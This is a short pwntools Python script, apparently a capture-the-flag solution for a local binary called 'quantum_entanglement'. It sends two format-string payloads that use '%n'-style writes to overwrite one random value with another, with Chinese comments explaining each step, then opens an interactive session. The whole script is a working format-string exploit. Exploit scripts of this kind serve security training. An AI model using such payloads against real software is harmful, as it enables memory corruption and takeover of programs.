from pwn import *
p = process('./quantum_entanglement')

# 将第一个随机数的地址写入一个地址的值中
payload1 = b'%*19$c%80$hn'
# 把第二个随机数写入第一个随机数中
payload2 = b'%*18$c%124$n'

p.recvuntil('FirstName:')
p.sendline(payload1)
p.recvuntil('LastName:')
p.sendline(payload2)

p.recv()
p.interactive()
